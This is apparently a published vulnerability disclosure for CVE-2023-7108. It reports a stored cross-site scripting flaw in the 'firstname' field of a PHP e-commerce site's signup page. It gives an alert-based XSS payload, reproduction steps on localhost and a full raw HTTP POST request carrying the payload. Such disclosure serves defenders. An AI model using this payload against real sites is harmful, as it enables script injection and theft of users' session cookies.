# CVE-2023-7108_E-Commerce Website - Stored Cross-site Scripting
+ **Exploit Title:** CVE-2023-7108_E-Commerce Website - Stored Cross-site Scripting
+ **Date:** 2023-24-12
+ **Exploit Author:** Hamdi Sevben
+ **Vendor Homepage:** https://code-projects.org/e-commerce-website-in-php-with-source-code/
+ **Software Link:** https://download-media.code-projects.org/2020/01/E-COMMERCE_WEBSITE_IN_PHP_WITH_SOURCE_CODE.zip
+ **Version:** 1.0
+ **Tested on:** Windows 10 Pro + PHP 8.1.6, Apache 2.4.53
+ **CVE:** CVE-2023-7108

## References: 
+ **CVE-2023-7108:** https://vuldb.com/?id.249003
+ https://www.cve.org/CVERecord?id=CVE-2023-7108

## Description:
E-Commerce Website 1.0 allows Stored Cross-site Scripting via parameter 'firstname' in "Electricks/Electricks-shop/pages/user_signup.php".
E-Commerce Website is vulnerable to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.
An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. 
This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Proof of Concept:
+ Go to the user registration form: "http://localhost/Electricks/Electricks-shop/pages/user_signup.php"
+ Fill First name with this payload: `<video/src=x onerror=alert(document.domain)>`
+ Fill the the all form and click Create Account button.
+ Then navigate to user login page: "http://localhost/Electricks/Electricks-shop/pages/user_login_page.php" and login.
+ Then XSS will be triggered permanently.
+ Refresh and alert will continue to pop-up.
+ Example request for 'firstname' parameter:
```
POST /Electricks/Electricks-shop/pages/user_signup.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 202
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/Electricks/Electricks-shop/pages/user_signup.php
Cookie: PHPSESSID=8imurtv40ut9ah7s8bk6auen4i
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

firstname=%3Cvideo%2Fsrc%3Dx+onerror%3Dalert%28document.domain%29%3E&middlename=test3&lastname=test3&email=test3&address=test3&contact=test3&username=test3&password=test&submit=
```
+ Go to user login page: "http://localhost/Electricks/Electricks-shop/pages/user_login_page.php" and login.
![3-1](https://github.com/h4md153v63n/CVEs/assets/5091265/931dcbe2-fc38-44ad-b314-a080f8a60cd0)
![3-2](https://github.com/h4md153v63n/CVEs/assets/5091265/753e20c4-eef8-4655-bc3f-869370c08d24)
